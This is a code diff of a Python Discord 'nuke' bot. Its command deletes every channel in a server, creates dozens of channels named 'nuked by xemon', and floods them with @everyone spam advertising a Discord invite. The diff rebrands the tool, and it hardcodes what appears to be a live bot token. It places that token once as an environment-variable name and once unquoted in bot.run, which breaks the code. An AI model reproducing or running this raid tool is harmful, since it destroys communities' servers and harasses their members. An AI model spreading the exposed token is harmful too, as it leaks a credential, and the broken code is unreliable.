@@ -3,7 +3,7 @@ from discord.ext import commands
 import asyncio
 import os
 
-TOKEN = os.getenv("DISCORD_TOKEN")
+TOKEN = os.getenv("MTM4ODg3NTI1NzgwNDM2MTk4OA.GnQc-h.qiKTHDc3V_q8KVKtt8lHL3D7FoqSRpZ7t7XdcE")
 
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix="!", intents=intents)
@@ -11,29 +11,29 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 荒らし文 = (
     "@everyone @here\n"
     "# Nuked by SYM\n"
-    "# [今すぐ参加](https://discord.gg/KdBrcWPw77)\n"
+    "# [今すぐ参加](https://discord.gg/snV9WUnX4h)\n"
     "# [GIF](https://imgur.com/NbBGFcf)\n"
     "# [GIF](https://imgur.com/pY7EpwN)"
 )
 
 @bot.event
 async def on_ready():
-    print(f"ログイン成功ログログ: {bot.user}")
+    print(f"😂: {bot.user}")
 
 @bot.command()
 async def nuke(ctx):
     guild = ctx.guild
     await ctx.message.delete()
 
-    print(" チャンネル削除ログ")
+    print("対戦ありがとうございました")
     delete_tasks = [asyncio.create_task(ch.delete()) for ch in guild.channels]
     await asyncio.gather(*delete_tasks, return_exceptions=True)
 
-    print(" チャンネル作成ログ")
+    print("チャンネル作成")
     new_channels = []
     for i in range(0, 60, 15):
         tasks = [
-            asyncio.create_task(guild.create_text_channel("nuked by sym"))
+            asyncio.create_task(guild.create_text_channel("nuked by xemon"))
             for _ in range(15)
         ]
         results = await asyncio.gather(*tasks, return_exceptions=True)
@@ -54,4 +54,4 @@ async def nuke(ctx):
     await asyncio.gather(*(spam(ch) for ch in new_channels))
     print("✅ nuke完了ログ")
 
-bot.run(TOKEN)
+bot.run(MTM4ODg3NTI1NzgwNDM2MTk4OA.GnQc-h.qiKTHDc3V_q8KVKtt8lHL3D7FoqSRpZ7t7XdcE)
